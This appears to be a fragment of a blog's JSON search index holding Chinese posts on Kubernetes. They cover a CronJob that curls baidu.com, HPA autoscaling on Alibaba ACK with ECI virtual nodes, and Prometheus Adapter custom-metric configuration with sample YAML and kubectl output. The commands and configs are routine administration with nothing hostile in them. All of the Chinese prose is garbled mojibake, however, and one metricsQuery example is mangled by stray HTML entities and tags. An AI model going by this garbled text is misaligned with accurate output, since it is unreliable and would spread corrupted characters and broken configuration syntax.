\u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eIfNotPresent\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e\u003cspan class=\"nt\"\u003ecommand\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"l\"\u003e/bin/sh\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- -\u003cspan class=\"l\"\u003ec\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e            \u003c/span\u003e- \u003cspan class=\"l\"\u003edate;echo \u0026#34;run crontab\u0026#34;;curl http://www.baidu.com\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e          \u003c/span\u003e\u003cspan class=\"nt\"\u003erestartPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eOnFailure\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessfulJobsHistoryLimit\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003efailedJobsHistoryLimit\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e2\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä¸Šé¢å°±è·‘äº†ä¸€ä¸ª busybox çš„ podï¼Œæ¯åˆ†é’Ÿå»è®¿é—®ç™¾åº¦ï¼Œç„¶ååœ¨ stdout è¾“å‡ºç»“æœ\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªæ²¡ä»€ä¹ˆï¼Œæ³¨æ„ä¸Šé¢æ–‡ä»¶çš„æœ€åä¸¤è¡Œã€‚é™åˆ¶æˆåŠŸä»¥åŠå¤±è´¥ job çš„ History æ•°é‡ï¼Œå¦‚æœä¸åŠ é™åˆ¶ï¼Œkubectl get pods ä¼šçœ‹åˆ°æ— ç©·æ— å°½çš„completed çŠ¶æ€çš„ curl-cron podã€‚\u003c/p\u003e","title":"æ›¿ä»£kubernetes crontabçš„ç¥å™¨kala"},{"content":"kubernetes çš„åŠ¨æ€ä¼¸ç¼© HPA æ˜¯éå¸¸æœ‰ç”¨çš„ç‰¹æ€§ã€‚\næˆ‘ä»¬çš„æœåŠ¡å™¨æ‰˜ç®¡åœ¨é˜¿é‡Œäº‘çš„ ACK ä¸Šï¼Œk8s æ ¹æ® cpu æˆ–è€… å†…å­˜çš„ä½¿ç”¨æƒ…å†µï¼Œä¼šè‡ªåŠ¨ä¼¸ç¼©å…³é”® pod çš„æ•°é‡ï¼Œä»¥åº”å¯¹å¤§æµé‡çš„æƒ…å½¢ã€‚è€Œä¸”æ›´å¦™çš„æ˜¯ï¼ŒåŠ¨æ€æ‰©å±•çš„ pod å¹¶ä¸æ˜¯ä½¿ç”¨è‡ªå·±çš„å›ºå®šæœåŠ¡å™¨ï¼Œè€Œæ˜¯ä½¿ç”¨é˜¿é‡ŒåŠ¨æ€çš„ ECI è™šæ‹ŸèŠ‚ç‚¹æœåŠ¡å™¨ï¼Œè¿™æ ·å°±çœŸçš„æ˜¯å³å¼€å³ç”¨ï¼Œç”¨å®Œå³æ¯ã€‚æœ‰å¤šå¤§æµé‡ä»˜å¤šå°‘é’±ï¼Œç‰©å°½å…¶ç”¨ã€‚\næˆ‘ä»¬å…ˆæ˜ç¡®ä¸€ä¸‹æ¦‚å¿µï¼š\nk8s çš„èµ„æºæŒ‡æ ‡è·å–æ˜¯é€šè¿‡ api æ¥å£æ¥è·å¾—çš„ï¼Œæœ‰ä¸¤ç§ apiï¼Œä¸€ç§æ˜¯æ ¸å¿ƒæŒ‡æ ‡ï¼Œä¸€ç§æ˜¯è‡ªå®šä¹‰æŒ‡æ ‡ã€‚\næ ¸å¿ƒæŒ‡æ ‡ï¼šCore metricsï¼Œç”±metrics-serveræä¾›APIï¼Œå³ metrics.k8s.ioï¼Œä»…æä¾›Nodeå’ŒPodçš„CPUå’Œå†…å­˜ä½¿ç”¨æƒ…å†µã€‚api æ˜¯ metrics.k8s.io\nè‡ªå®šä¹‰æŒ‡æ ‡ï¼šCustom Metricsï¼Œç”±Prometheus Adapteræä¾›APIï¼Œå³ custom.metrics.k8s.ioï¼Œç”±æ­¤å¯æ”¯æŒä»»æ„Prometheusé‡‡é›†åˆ°çš„è‡ªå®šä¹‰æŒ‡æ ‡ã€‚api æ˜¯ custom.metrics.k8s.io å’Œ external.metrics.k8s.io\nä¸€ã€æ ¸å¿ƒæŒ‡æ ‡metrics-server é˜¿é‡Œçš„ ACK ç¼ºçœæ˜¯è£…äº† metrics-server çš„ï¼Œçœ‹ä¸€ä¸‹ï¼Œç³»ç»Ÿé‡Œæœ‰ä¸€ä¸ªmetrics-server\nkubectl get pods -n kube-system å†çœ‹çœ‹ api çš„æ ¸å¿ƒæŒ‡æ ‡èƒ½æ‹¿åˆ°ä»€ä¹ˆï¼Œå…ˆçœ‹ Node çš„æŒ‡æ ‡ï¼š\nkubectl get --raw \u0026#34;/apis/metrics.k8s.io\u0026#34; | jq . kubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1\u0026#34; | jq . kubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1/nodes\u0026#34; | jq . å¯ä»¥çœ‹åˆ°é˜¿é‡Œ eci è™šæ‹ŸèŠ‚ç‚¹çš„ cpu å’Œ memory èµ„æºã€‚\nå†çœ‹çœ‹ Pod çš„æŒ‡æ ‡ï¼š\nkubectl get --raw \u0026#34;/apis/metrics.k8s.io/v1beta1/pods\u0026#34; | jq . å¯ä»¥æ¸…æ¥šå¾—çœ‹åˆ°è°ƒåº¦åˆ°è™šæ‹ŸèŠ‚ç‚¹ä¸Šçš„ Pod çš„ cpu å’Œ memory èµ„æºä½¿ç”¨æƒ…å†µã€‚å¤§å®¶çœ‹åˆ°åªæœ‰ cpu å’Œ memoryï¼Œè¿™å°±å¤Ÿäº†ã€‚\nç»™ä¸ªå…¨éƒ¨ä½¿ç”¨è‡ªå·± Work Node å®ä½“èŠ‚ç‚¹ä¼¸ç¼©çš„ä¾‹å­ï¼š\nphp-hpa.yaml (è¿™é‡Œå®šä¹‰äº†å¹³å‡cpuä½¿ç”¨åˆ°è¾¾80%æˆ–è€…å†…å­˜å¹³å‡ä½¿ç”¨åˆ°200Må°±ä¼¸ç¼©ï¼‰ï¼š\nphp-hpa è§„èŒƒäº† php-deploy å¦‚ä½•ä¼¸ç¼©ï¼Œæœ€å°2ï¼Œæœ€å¤§10ï¼š\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: php-hpa namespace: default spec: scaleTargetRef: apiVersion: extensions/v1beta1 kind: Deployment name: php-deploy minReplicas: 2 maxReplicas: 10 metrics: - type: Resource resource: name: cpu targetAverageUtilization: 80 - type: Resource resource: name: memory targetAverageValue: 200Mi å†ç»™ä¸ªé˜¿é‡Œ ACK ä½¿ç”¨ ECI è™šæ‹ŸèŠ‚ç‚¹ä¼¸ç¼©çš„ä¾‹å­ï¼š\næˆ‘ä»¬é¦–å…ˆå®šä¹‰ä¸€ä¸ªæ­£å¸¸çš„ deployment ï¼Œphp-deployï¼Œè¿™ä¸ªå°±æ­£å¸¸å®šä¹‰è·Ÿåˆ«çš„æ²¡åŒºåˆ«ã€‚\nç„¶åå†å®šä¹‰æ‰©å±•åˆ° eci èŠ‚ç‚¹çš„ ElasticWorloadï¼Œelastic-phpï¼Œè¿™ä¸ªç”¨æ¥æ§åˆ¶ php-deploy æ‹“å±•åˆ° eci è™šæ‹ŸèŠ‚ç‚¹å»\nä¸‹é¢æ˜¯å›ºå®š6ä¸ªï¼ŒåŠ¨æ€24ä¸ªï¼Œåˆè®¡30ä¸ª\napiVersion: autoscaling.alibabacloud.com/v1beta1 kind: ElasticWorkload metadata: name: elastic-php spec: sourceTarget: name: php-deploy kind: Deployment apiVersion: apps/v1 min: 0 max: 6 elasticUnit: - name: virtual-kubelet labels: virtual-kubelet: \u0026#34;true\u0026#34; alibabacloud.com/eci: \u0026#34;true\u0026#34; annotations: virtual-kubelet: \u0026#34;true\u0026#34; nodeSelector: type: \u0026#34;virtual-kubelet\u0026#34; tolerations: - key: \u0026#34;virtual-kubelet.io/provider\u0026#34; operator: \u0026#34;Exists\u0026#34; min: 0 max: 24 replicas: 30 ç„¶åå®šä¹‰ HPA php-hpa æ¥æ§åˆ¶ elastic-php çš„è‡ªåŠ¨ä¼¸ç¼©\napiVersion: autoscaling/v2beta2 kind: HorizontalPodAutoscaler metadata: name: php-hpa namespace: default spec: scaleTargetRef: apiVersion: autoscaling.alibabacloud.com/v1beta1 kind: ElasticWorkload name: elastic-php minReplicas: 6 maxReplicas: 30 metrics: - type: Resource resource: name: cpu target: type: Utilization averageUtilization: 90 behavior: scaleUp: policies: #- type: percent # value: 500% - type: Pods value: 5 periodSeconds: 180 scaleDown: policies: - type: Pods value: 1 periodSeconds: 600 ä¸Šé¢çš„ ElasticWorkload éœ€è¦ä»”ç»†è§£é‡Šä¸€ä¸‹ï¼Œphp-deploy å®šä¹‰çš„ pod å‰¯æœ¬å›ºå®šæ˜¯6ä¸ªï¼Œè¿™6ä¸ªéƒ½æ˜¯åœ¨æˆ‘ä»¬è‡ªå·±èŠ‚ç‚¹ä¸Šä¸ç”¨å†ä»˜è´¹ï¼Œç„¶å ECI çš„ pod å‰¯æœ¬æ•°æ˜¯0ä¸ªåˆ°24ä¸ªï¼Œé‚£ä¹ˆæ€»ä½“podæ•°é‡å°±æ˜¯ 6+24 = 30 ä¸ªï¼Œå…¶ä¸­ 24ä¸ªæ˜¯å¯ä»¥åœ¨è™šæ‹ŸèŠ‚ç‚¹ä¸Šä¼¸ç¼©çš„ã€‚è€Œ php-hpa å®šä¹‰äº†ä¼¸ç¼©èŒƒå›´æ˜¯ 6-30ï¼Œé‚£å°±æ„å‘³ç€å¹³æ—¶æµé‡å°çš„æ—¶å€™ç”¨çš„éƒ½æ˜¯è‡ªå·±æœåŠ¡å™¨ä¸Šé‚£6ä¸ªå›ºå®š podï¼Œå¦‚æœæµé‡å¤§äº†ï¼Œå°±ä¼šæ‰©å¤§åˆ° eci è™šæ‹ŸèŠ‚ç‚¹ä¸Šï¼Œè™šæ‹ŸèŠ‚ç‚¹æœ€å¤§é‡æ˜¯24ä¸ªï¼Œå¦‚æœæµé‡é™ä¸‹æ¥äº†ï¼Œå°±ä¼šç¼©å›å»ï¼Œç¼©åˆ°è‡ªå·±æœåŠ¡å™¨çš„6ä¸ªpod ä¸Šå»ã€‚è¿™æ ·å¯ä»¥ç²¾ç¡®æ§åˆ¶æˆæœ¬ã€‚\nphp-hpa å®šä¹‰çš„æœ€ä¸‹é¢ï¼Œæ‰©å¤§çš„æ—¶å€™å¦‚æœ cpu åˆ°äº† 90%ï¼Œé‚£ä¹ˆä¸€æ¬¡æ€§æ‰©å¤§5ä¸ªpodï¼Œç¼©å°çš„æ—¶å€™ä¸€ä¸ªä¸€ä¸ªç¼©ï¼Œè¿™æ ·é¿å…å¸¦æ¥æµé‡çš„æ¯›åˆºã€‚\näºŒã€è‡ªå®šä¹‰æŒ‡æ ‡Prometheus å¦‚ä¸Šå…¶å®å·²ç»å¯ä»¥æ»¡è¶³å¤§å¤šæ•°è¦æ±‚äº†ï¼Œä½†æ˜¯æƒ³æ›´è¿›ä¸€æ­¥ï¼Œæ¯”å¦‚æƒ³ä» Prometheus æ‹¿åˆ°çš„æŒ‡æ ‡æ¥è¿›è¡Œ hpa ä¼¸ç¼©ã€‚\né‚£å°±æ¯”è¾ƒéº»çƒ¦äº†\nçœ‹ä¸Šå›¾ï¼ŒPrometheus Operator é€šè¿‡ http æ‹‰å– pod çš„ metric æŒ‡æ ‡ï¼ŒPrometheus Adaptor å†æ‹‰å– Prometheus Operator å­˜å‚¨çš„æ•°æ®å¹¶ä¸”æš´éœ²ç»™ Custom API ä½¿ç”¨ã€‚ä¸ºå•¥è¦å¼„è¿™äºŒä¸ªä¸œè¥¿å‘¢ï¼Ÿå› ä¸º Prometheus é‡‡é›†åˆ°çš„ metrics æ•°æ®å¹¶ä¸èƒ½ç›´æ¥ç»™ k8s ç”¨ï¼Œå› ä¸ºä¸¤è€…æ•°æ®æ ¼å¼ä¸å…¼å®¹ï¼Œè¿˜éœ€è¦å¦å¤–ä¸€ä¸ªç»„ä»¶(kube-state-metrics)ï¼Œå°†prometheus çš„ metrics æ•°æ®æ ¼å¼è½¬æ¢æˆ k8s API æ¥å£èƒ½è¯†åˆ«çš„æ ¼å¼ï¼Œè½¬æ¢ä»¥åï¼Œå› ä¸ºæ˜¯è‡ªå®šä¹‰APIï¼Œæ‰€ä»¥è¿˜éœ€è¦ç”¨ Kubernetes aggregator åœ¨ä¸» API æœåŠ¡å™¨ä¸­æ³¨å†Œï¼Œä»¥ä¾¿å…¶ä»–ç¨‹åºç›´æ¥é€šè¿‡ /apis/ æ¥è®¿é—®ã€‚\næˆ‘ä»¬é¦–å…ˆæ¥çœ‹çœ‹å¦‚ä½•å®‰è£…è¿™äºŒä¸ªä¸œè¥¿ï¼š\né¦–å…ˆè£… Prometheus Operatorï¼Œè¿™å®¶ä¼™ä¼šè‡ªåŠ¨è£…ä¸€æ†ä¸œè¥¿ï¼Œ Pormetheusã€Grafanaã€Alert managerç­‰ï¼Œæ‰€ä»¥æœ€å¥½ç»™å®ƒå•ç‹¬å¼„ä¸€ä¸ªå‘½åç©ºé—´\nprometheus-operator prometheus alertmanager node-exporter kube-state-metrics grafana #å®‰è£… helm install --name prometheus --namespace monitoring stable/prometheus-operator #å¼€ä¸ªç«¯å£æœ¬åœ°è®¿é—® prometheus çš„é¢æ¿ï¼Œcurl http://localhost:9090 kubectl port-forward --namespace monitoring svc/prometheus-operator-prometheus 9090:9090 #çœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆpod kubectl get pod -n monitoring NAME READY STATUS RESTARTS AGE pod/alertmanager-prometheus-operator-alertmanager-0 2/2 Running 0 98m pod/prometheus-operator-grafana-857dfc5fc8-vdnff 2/2 Running 0 99m pod/prometheus-operator-kube-state-metrics-66b4c95cd9-mz8nt 1/1 Running 0 99m pod/prometheus-operator-operator-56964458-8sspk 2/2 Running 0 99m pod/prometheus-operator-prometheus-node-exporter-dcf5p 1/1 Running 0 99m pod/prometheus-operator-prometheus-node-exporter-nv6ph 1/1 Running 0 99m pod/prometheus-prometheus-operator-prometheus-0 3/3 Running 1 98m #çœ‹çœ‹éƒ½æœ‰ä»€ä¹ˆsvc kubectl get svc -n monitoring NAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGE alertmanager-operated ClusterIP None \u0026lt;none\u0026gt; 9093/TCP,9094/TCP,9094/UDP 100m prometheus-operated ClusterIP None \u0026lt;none\u0026gt; 9090/TCP 100m prometheus-operator-alertmanager NodePort 10.1.238.78 \u0026lt;none\u0026gt; 9093:31765/TCP 102m prometheus-operator-grafana NodePort 10.1.125.228 \u0026lt;none\u0026gt; 80:30284/TCP 102m prometheus-operator-kube-state-metrics ClusterIP 10.1.187.129 \u0026lt;none\u0026gt; 8080/TCP 102m prometheus-operator-operator ClusterIP 10.1.242.61 \u0026lt;none\u0026gt; 8080/TCP,443/TCP 102m prometheus-operator-prometheus NodePort 10.1.156.181 \u0026lt;none\u0026gt; 9090:30268/TCP 102m prometheus-operator-prometheus-node-exporter ClusterIP 10.1.226.134 \u0026lt;none\u0026gt; 9100/TCP 102m æˆ‘ä»¬çœ‹åˆ°æœ‰ prometheus-operated è¿™ä¸ªClusterIP svcï¼Œæ³¨æ„ k8s çš„ coredns åŸŸåè§£ææ–¹å¼ï¼Œé›†ç¾¤çš„å†…éƒ¨åŸŸåæ˜¯ hbb.localï¼Œé‚£ä¹ˆè¿™ä¸ª svc çš„å…¨ hostname å°±æ˜¯ prometheus-operated.monitoring.svc.hbb.localï¼Œé›†ç¾¤ä¸­å¯ä»¥å–èˆåˆ° prometheus-operated.monitoring æˆ–è€… prometheus-operated.monitoring.svc æ¥è®¿é—®ã€‚\nç„¶åå†è£… Prometheus Adaptorï¼Œæˆ‘ä»¬è¦æ ¹æ®ä¸Šé¢çš„å…·ä½“æƒ…å†µæ¥è®¾ç½® prometheus.urlï¼š\nhelm install --name prometheus-adapter stable/prometheus-adapter --set prometheus.url=\u0026#34;http://prometheus-operated.monitoring.svc\u0026#34;,prometheus.port=\u0026#34;9090\u0026#34; --set image.tag=\u0026#34;v0.4.1\u0026#34; --set rbac.create=\u0026#34;true\u0026#34; --namespace custom-metrics è®¿é—® external å’Œ custom éªŒè¯ä¸€ä¸‹ï¼š\nkubectl get --raw \u0026#34;/apis/external.metrics.k8s.io/v1beta1\u0026#34; | jq { \u0026#34;kind\u0026#34;: \u0026#34;APIResourceList\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;groupVersion\u0026#34;: \u0026#34;external.metrics.k8s.io/v1beta1\u0026#34;, \u0026#34;resources\u0026#34;: [] } kubectl get --raw \u0026#34;/apis/custom.metrics.k8s.io/v1beta1\u0026#34; | jq { \u0026#34;kind\u0026#34;: \u0026#34;APIResourceList\u0026#34;, \u0026#34;apiVersion\u0026#34;: \u0026#34;v1\u0026#34;, \u0026#34;groupVersion\u0026#34;: \u0026#34;custom.metrics.k8s.io/v1beta1\u0026#34;, \u0026#34;resources\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;*/agent.googleapis.com|agent|api_request_count\u0026#34;, \u0026#34;singularName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;namespaced\u0026#34;: true, \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, \u0026#34;verbs\u0026#34;: [ \u0026#34;get\u0026#34; ] }, [...lots more metrics...] { \u0026#34;name\u0026#34;: \u0026#34;*/vpn.googleapis.com|tunnel_established\u0026#34;, \u0026#34;singularName\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;namespaced\u0026#34;: true, \u0026#34;kind\u0026#34;: \u0026#34;MetricValueList\u0026#34;, \u0026#34;verbs\u0026#34;: [ \u0026#34;get\u0026#34; ] } ] } é‡å¤´æˆåœ¨ä¸‹é¢ï¼Œå…¶å® Prometheus Adaptor ä» Prometheus æ‹¿çš„æŒ‡æ ‡ä¹Ÿæ˜¯æœ‰é™çš„ï¼Œå¦‚æœæœ‰è‡ªå®šä¹‰æŒ‡æ ‡ï¼Œæˆ–è€…æƒ³å¤šæ‹¿äº›ï¼Œå°±å¾—ç»§ç»­æ‹“å±•ï¼ï¼ï¼\næœ€å¿«çš„æ–¹å¼æ˜¯ç¼–è¾‘ namespace æ˜¯ custom-metrics ä¸‹çš„ configmap ï¼Œåå­—æ˜¯ Prometheus-adapterï¼Œå¢åŠ seriesQuery\nseriesQueryé•¿è¿™æ ·å­ï¼Œä¸‹é¢æ˜¯ç»Ÿè®¡äº†æ‰€æœ‰ app=shopping-kart çš„ pod 5åˆ†é’Ÿä¹‹å†…çš„å˜åŒ–é€Ÿç‡æ€»å’Œï¼š\napiVersion: v1 kind: ConfigMap metadata: labels: app: prometheus-adapter chart: prometheus-adapter-v1.2.0 heritage: Tiller release: prometheus-adapter name: prometheus-adapter data: config.yaml: | - seriesQuery: \u0026#39;{app=\u0026#34;shopping-kart\u0026#34;,kubernetes_namespace!=\u0026#34;\u0026#34;,kubernetes_pod_name!=\u0026#34;\u0026#34;}\u0026#39; seriesFilters: [] resources: overrides: kubernetes_namespace: resource: namespace kubernetes_pod_name: resource: pod name: matches: \u0026#34;\u0026#34; as: \u0026#34;\u0026#34; metricsQuery: sum(rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[5m])) by (\u0026lt;\u0026lt;.GroupBy\u0026gt;\u0026gt;) Adapter configmapçš„é…ç½®å¦‚ä¸‹ï¼š\nseriesQuery tells the Prometheus Metric name to the adapterï¼ˆè¦å»prometheusæ‹¿ä»€ä¹ˆæŒ‡æ ‡ï¼‰\nresources tells which Kubernetes resources each metric is associated with or which labels does the metric include, e.g., namespace, pod etc.ï¼ˆå…³è”çš„èµ„æºï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯ pod å’Œ namespaceï¼‰\nmetricsQuery is the actual Prometheus query that needs to be performed to calculate the actual values.ï¼ˆå åŠ  seriesQuery åå‘é€ç»™prometheusçš„å®é™…æŸ¥è¯¢ï¼Œç”¨äºå¾—å‡ºæœ€ç»ˆçš„æŒ‡æ ‡å€¼ï¼‰\nname with which the metric should be exposed to the custom metrics APIï¼ˆæš´éœ²ç»™APIçš„æŒ‡æ ‡åï¼‰\nä¸¾ä¸ªä¾‹å­ï¼šå¦‚æœæˆ‘ä»¬è¦è®¡ç®— container_network_receive_packets_totalï¼Œåœ¨Prometheus UIé‡Œæˆ‘ä»¬è¦è¾“å…¥ä»¥ä¸‹è¡Œæ¥æŸ¥è¯¢:\nsum(rate(container_network_receive_packets_total{namespace=\u0026ldquo;default\u0026rdquo;,pod=~\u0026ldquo;php-deploy.*\u0026rdquo;}[10m])) by (pod)*\nè½¬æ¢æˆ Adapter çš„ metricsQuery å°±å˜æˆè¿™æ ·äº†ï¼Œå¾ˆéš¾æ‡‚ï¼š\n*metricsQuery: \u0026lsquo;sum(rate(\u0026laquo;.series\u0026raquo;{\u0026laquo;.labelmatchers\u0026raquo;}10m])) by (\u0026laquo;.groupby\u0026raquo;)\u0026rsquo;\u0026lt;/.groupby\u0026gt;\u0026lt;/.labelmatchers\u0026gt;\u0026lt;/.series\u0026gt;*\nå†ç»™ä¸ªä¾‹å­ï¼š\nrate(gorush_total_push_count{instance=\u0026#34;push.server.com:80\u0026#34;,job=\u0026#34;push-server\u0026#34;}[5m]) å˜æˆ adapter çš„ configmap\napiVersion: v1 data: config.yaml: | rules: - seriesQuery: \u0026#39;{__name__=~\u0026#34;gorush_total_push_count\u0026#34;}\u0026#39; seriesFilters: [] resources: overrides: namespace: resource: namespace pod: resource: pod name: matches: \u0026#34;\u0026#34; as: \u0026#34;gorush_push_per_second\u0026#34; metricsQuery: rate(\u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;}[5m]) ä¿®æ”¹äº†configmapï¼Œå¿…é¡»é‡å¯prometheus-adapterçš„podé‡æ–°åŠ è½½é…ç½®ï¼ï¼ï¼\nåœ¨hpaä¸­åº”ç”¨çš„ä¾‹å­ï¼š\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: gorush-hpa spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: gorush minReplicas: 1 maxReplicas: 5 metrics: - type: Pods pods: metricName: gorush_push_per_second targetAverageValue: 1m å†æ¥ä¸€ä¸ªï¼Œprometheus å‡½æ•°åæ˜¯ myapp_client_connectedï¼š\napiVersion: v1 data: config.yaml: | rules: - seriesQuery: \u0026#39;{__name__= \u0026#34;myapp_client_connected\u0026#34;}\u0026#39; seriesFilters: [] resources: overrides: k8s_namespace: resource: namespace k8s_pod_name: resource: pod name: matches: \u0026#34;myapp_client_connected\u0026#34; as: \u0026#34;\u0026#34; metricsQuery: \u0026lt;\u0026lt;.Series\u0026gt;\u0026gt;{\u0026lt;\u0026lt;.LabelMatchers\u0026gt;\u0026gt;,container_name!=\u0026#34;POD\u0026#34;} hpaçš„ä½¿ç”¨\napiVersion: autoscaling/v2beta1 kind: HorizontalPodAutoscaler metadata: name: hpa-sim namespace: default spec: scaleTargetRef: apiVersion: apps/v1 kind: Deployment name: hpa-sim minReplicas: 1 maxReplicas: 10 metrics: - type: Pods pods: metricName: myapp_client_connected targetAverageValue: 20 å¾ˆå¤æ‚å§ã€‚æˆ‘ä»¬ä¸‹é¢ç»™ä¸ªè¯¦ç»†ä¾‹å­\nä¸‰ã€è‡ªå®šä¹‰æŒ‡æ ‡å…¨å¥—ä¾‹å­ æˆ‘ä»¬å…ˆå®šä¹‰ä¸€ä¸ª deploymentï¼Œè¿è¡Œä¸€ä¸ª nginx-vts çš„ podï¼Œè¿™ä¸ªé•œåƒå…¶å®å·²ç»è‡ªå·±æš´éœ²å‡ºäº† metric æŒ‡æ ‡\napiVersion: apps/v1 kind: Deployment metadata: name: nginx-deploy annotations: prometheus.io/scrape: \u0026#34;true\u0026#34; prometheus.io/port: \u0026#34;80\u0026#34; prometheus.io/path: \u0026#34;/status/format/prometheus\u0026#34; spec: selector: matchLabels: app: nginx-deploy template: metadata: labels: app: nginx-deploy spec: containers: - name: nginx-deploy image: cnych/nginx-vts:v1.0 resources: limits: cpu: 50m requests: cpu: 50m ports: - containerPort: 80 name: http ç„¶åå®šä¹‰ä¸ª svcï¼ŒæŠŠ80ç«¯å£æš´éœ²å‡ºå»\napiVersion: v1 kind: Service metadata: name: nginx-svc spec: ports: - port: 80 targetPort: 80 name: http selector: app: nginx-deploy type: ClusterIP prometheus æ˜¯è‡ªåŠ¨å‘ç°çš„ï¼Œæ‰€ä»¥ annotations å°±ä¼šè§¦å‘ prometheus è‡ªåŠ¨å¼€å§‹æ”¶é›†è¿™äº› nginx metricæŒ‡æ ‡\né›†ç¾¤å†…èµ·ä¸ªshellï¼Œè®¿é—®çœ‹çœ‹\n$ curl nginx-svc.default.svc.hbb.local/status/format/prometheus # HELP nginx_vts_info Nginx info # TYPE nginx_vts_info gauge nginx_vts_info{hostname=\u0026#34;nginx-deployment-65d8df7488-c578v\u0026#34;,version=\u0026#34;1.13.12\u0026#34;} 1 # HELP nginx_vts_start_time_seconds Nginx start time # TYPE nginx_vts_start_time_seconds gauge nginx_vts_start_time_seconds 1574283147.043 # HELP nginx_vts_main_connections Nginx connections # TYPE nginx_vts_main_connections gauge nginx_vts_main_connections{status=\u0026#34;accepted\u0026#34;} 215 nginx_vts_main_connections{status=\u0026#34;active\u0026#34;} 4 nginx_vts_main_connections{status=\u0026#34;handled\u0026#34;} 215 nginx_vts_main_connections{status=\u0026#34;reading\u0026#34;} 0 nginx_vts_main_connections{status=\u0026#34;requests\u0026#34;} 15577 nginx_vts_main_connections{status=\u0026#34;waiting\u0026#34;} 3 nginx_vts_main_connections{status=\u0026#34;writing\u0026#34;} 1 # HELP nginx_vts_main_shm_usage_bytes Shared memory [ngx_http_vhost_traffic_status] info # TYPE nginx_vts_main_shm_usage_bytes gauge nginx_vts_main_shm_usage_bytes{shared=\u0026#34;max_size\u0026#34;} 1048575 nginx_vts_main_shm_usage_bytes{shared=\u0026#34;used_size\u0026#34;} 3510 nginx_vts_main_shm_usage_bytes{shared=\u0026#34;used_node\u0026#34;} 1 # HELP nginx_vts_server_bytes_total The request/response bytes # TYPE nginx_vts_server_bytes_total counter # HELP nginx_vts_server_requests_total The requests counter # TYPE nginx_vts_server_requests_total counter # HELP nginx_vts_server_request_seconds_total The request processing time in seconds # TYPE nginx_vts_server_request_seconds_total counter # HELP nginx_vts_server_request_seconds The average of request processing times in seconds # TYPE nginx_vts_server_request_seconds gauge # HELP nginx_vts_server_request_duration_seconds The histogram of request processing time # TYPE nginx_vts_server_request_duration_seconds histogram # HELP nginx_vts_server_cache_total The requests cache counter # TYPE nginx_vts_server_cache_total counter nginx_vts_server_bytes_total{host=\u0026#34;_\u0026#34;,direction=\u0026#34;in\u0026#34;} 3303449 nginx_vts_server_bytes_total{host=\u0026#34;_\u0026#34;,direction=\u0026#34;out\u0026#34;} 61641572 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;1xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;2xx\u0026#34;} 15574 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;3xx\u0026#34;} 0 nginx_vts_server_requests_total{host=\u0026#34;_\u0026#34;,code=\u0026#34;4xx\u0026#34;} 2 